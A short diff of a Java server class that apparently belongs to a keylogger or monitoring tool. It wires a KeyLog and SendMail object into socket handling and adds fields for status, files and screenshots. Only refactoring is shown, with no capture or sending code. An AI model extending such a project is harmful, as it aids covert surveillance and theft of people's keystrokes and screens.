@@ -3,10 +3,16 @@ package email;
 import java.net.ServerSocket;
 import java.net.Socket;
 
+import javax.swing.ImageIcon;
+
 public class ServerThreading extends Thread {
+  
+  public static String statusRunning = "nothing is running!";
+  public static String status = "";
+  public static String fileDemo = "";
+  public static ImageIcon screenshotDemo;
 
   public KeyLog keylog;
-  public static String status = "No notification";
   SendMail send;
 
   public ServerThreading(KeyLog keyLog, SendMail send) {
@@ -21,7 +27,7 @@ public class ServerThreading extends Thread {
       boolean stop = false;
       while (!stop) {
         Socket socket = serverSocket.accept();
-        ClientThreading clientSocket = new ClientThreading(
+        ServerProcess clientSocket = new ServerProcess(
           socket,
           keylog,
           send
